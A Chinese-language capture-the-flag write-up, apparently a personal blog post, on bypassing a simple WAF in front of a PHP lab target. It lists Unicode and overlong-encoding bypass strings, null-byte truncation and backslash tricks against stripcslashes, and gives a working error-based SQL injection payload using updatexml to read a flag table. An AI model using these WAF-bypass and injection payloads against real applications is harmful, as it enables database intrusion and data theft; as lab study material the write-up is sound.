一个简单WAF的WriteUp

2020-07-29 3 min read # Web # WriteUps

根据尝试，WAF(Web Application Firewall)会过滤：

    WAF会拦截单引号；WAF会拦截ascii码不在31~127的字符
    select|insert|update|delete|load_file关键字。

尝试使用大小写绕过，无效。非ASCII编码绕过，无效。
不知道为什么他过去了http://10.214.160.13:10005/?exp=selec%00%74 貌似是PHP截断。
http://10.214.160.13:10005/?exp=union%20selec%00t%20*%20from%20flag

一些常见的用Unicode字符的绕过：
单引号：%u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7
空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0
左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8
右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9
但是都没用

由于这里背后是PHP代码，考虑使用转义符\047代替单引号。
http://10.214.160.13:10005/?exp=\027%20union%20selec%00t%20*%20from%20flag%20where%201=1%20or\027
并不行。stripcslashes（）删除反斜杠
删除反斜杠，倒是可以用s\elect来避开关键字的限制了

http://10.214.160.13:10005/?exp=\047%20union%20sel\ect%20*%20from%20flag
http://10.214.160.13:10005/?exp=1\047%20union%20sel\ect%20*%20from%20flag\047
以上有语法错误，因为delete不能union....(我在想什么)

考虑报错注入UpdateXML(参考链接：https://blog.csdn.net/qq_37873738/article/details/88042610)
\047 or updatexml(0x7e,(sel\ect * from flag),1) or \047,成功解决。
对了，%00截断的漏洞在5.3.4版本的PHP被修复了。
等等，不是反斜杠被删除了吗，我怎么过去的。？？？？？？
PHP在线工具
以下代码值得参考，PHP不愧是最好的语言。我人给整傻了。这就是我绕过去的原因了。

<?php
	$exp = "\\123 we\\ew ";
	echo $exp,"\n";
	$exp = stripcslashes($exp); 
	echo $exp;
?>

PHP Document：stripcslashes — 反引用一个使用 addcslashes() 转义的字符串（https://www.php.net/stripcslashes）
也许是经过函数处理之后，能转义的就转义了，不能转义的就去了。
